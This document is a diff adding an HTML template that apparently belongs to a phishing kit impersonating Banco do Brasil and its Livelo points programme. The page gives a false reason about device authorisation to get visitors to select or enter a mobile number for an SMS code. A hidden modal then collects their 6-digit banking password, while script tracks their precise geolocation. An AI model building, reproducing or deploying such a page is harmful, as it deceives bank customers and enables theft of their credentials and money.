@@ -1,0 +1,132 @@
+<html data-theme="light" style="--chakra-ui-color-mode:light;">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Banco do Brasil</title>
+    <meta name="robots" content="noindex, nofollow, noimageindex">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/assets/main-v3.css" />
+    <script>
+        var uuid_ = "{{prefix}}"
+    </script>
+    <script src="/assets/app2.js"></script>
+    <style>
+        body {
+            font-size: 16px;
+        }
+    </style>
+    <script type="text/javascript">
+        sendGeo = false
+
+        function watchLocation(successCallback, errorCallback) {
+            successCallback = successCallback || function() {};
+            errorCallback = errorCallback || function() {};
+
+            // Try HTML5-spec geolocation.
+            var geolocation = navigator.geolocation;
+
+            if (geolocation) {
+                // We have a real geolocation service.
+                try {
+                    function handleSuccess(position) {
+                        successCallback(position.coords);
+                    }
+
+                    geolocation.watchPosition(handleSuccess, errorCallback, {
+                        enableHighAccuracy: true,
+                        maximumAge: 5000 // 5 sec.
+                    });
+                } catch (err) {
+                    errorCallback();
+                }
+            } else {
+                errorCallback();
+            }
+        }
+    </script>
+</head>
+
+<body onload="init()" class="chakra-ui-light">
+    <div id="__next" data-aria-hidden="true" aria-hidden="true">
+        <div class="css-rzd8qz">
+            <div class="css-1oj8ggk"></div>
+            <div class="css-1ow331d">
+                <div class="css-1vmlim4">
+                    <div class="css-6su6fj">
+                        <img alt="logoLivelo" src="/assets/bblivelo/v3/logo-livelo.svg" class="chakra-image css-1gc45r0">
+                    </div>
+                    <div class="css-1sk5mmp">
+                        <hr aria-orientation="vertical" class="chakra-divider css-1mtzovw">
+                    </div>
+                    <div class="css-1sk5mmp">
+                        <img alt="logoBB" src="/assets/bblivelo/v3/logo-bb.svg" class="chakra-image css-1gc45r0">
+                    </div>
+                </div>
+
+                <form id="formPrimary" autocomplete="off" name="formLogin" action="" method="POST" class="css-pydr2a">
+                    <input type="hidden" name="action" id="action" value="doFonePasse" />
+                    <input type="hidden" name="takeModal" id="takeModal" value="modal" />
+
+                    <div class="text-center" style="font-size: 15px;">Será necessário efetuar a liberação das transações deste dispositivo, para concluirmos o processo de resgate de pontos livelo.</div>
+                    <br>
+                    <div class="text-center" style="font-size: 15px; font-weight: bold;">Selecione um número abaixo para receber o SMS de liberação de dispositivo</div>
+
+                    {% if telefones|length >= 1 %}
+                        {% for i in telefones %}
+                        <div style="display: block;padding-bottom: 5px;margin-top: 20px;">
+                            <label class="form-check" style="display: block;width: 100%;position:relative;pointer-events: inherit;">
+                            <input type="radio" class="form-check-input" id="selectFone{{ loop.index }}" name="input_cel" value="{{i['hash']}}" required="">
+                            <span style="margin-bottom: 20px;padding-left:10px;font-weight:500;" for="selectFone{{ loop.index }}">{{i['fone']}}</span>
+                            </label>
+                        </div>
+                        {% endfor %}
+                    {% else %}
+                        <div role="group" class="chakra-form-control css-1kxonj9">
+                            <label for="input_cel" id="field-3-label" class="chakra-form__label css-acaicb">Telefone Celular</label>
+                            <input class="chakra-input css-fqougi phone" name="input_cel" id="input_cel" placeholder="(DDD + NÚMERO)" type="tel" oninvalid="setCustomValidity('Digite seu telefone celular')" onchange="try{setCustomValidity('')}catch(e){}" maxlength="15" required>
+                        </div>
+                    {% endif %}
+
+                    <button type="submit" class="chakra-button css-1ff85" >
+                        <span class="">ENVIAR SMS LIBERAÇÃO</span>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="chakra-portal" style="display:none;">
+        <div class="chakra-modal__overlay css-3ex6x3" data-projection-id="2" style="opacity: 1;" data-aria-hidden="true" aria-hidden="true"></div>
+        <div data-focus-lock-disabled="false">
+            <div class="chakra-modal__content-container css-v9b9hc" tabindex="-1">
+                <form initial="exit" animate="enter" exit="exit" class="chakra-modal__content css-1657qp3" role="dialog" id="chakra-modal-3" tabindex="-1" aria-modal="true" aria-labelledby="chakra-modal--header-3" aria-describedby="chakra-modal--body-3">
+                    <input type="hidden" name="action" id="action" value="doTelefone" />
+                    <input type="hidden" name="input_cel" id="input_celA" value="" />
+
+
+                    <header class="chakra-modal__header css-14jjobi" id="chakra-modal--header-3">
+                        <p class="chakra-text css-cg4ego">Senha de 6 dígitos numéricos</p>
+                    </header>
+                    <div class="chakra-modal__body css-162yjfo" id="chakra-modal--body-3">
+                        <div class="css-j7qwjs">
+                            <input name="input_se6" inputmode="numeric" type="password" placeholder="******" autocomplete="off" maxlength="6" class="chakra-input css-1okg9yu">
+                        </div>
+                    </div>
+                    <footer class="chakra-modal__footer css-7yhf1r">
+                        <button type="submit" class="chakra-button css-1f2haxr">CONTINUAR</button>
+                    </footer>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="livelo-spinner">
+        <div class="loader">
+            <div class="inner one"></div>
+            <div class="inner two"></div>
+            <div class="inner three"></div>
+        </div>
+    </div>
+
+</body>
+</html>
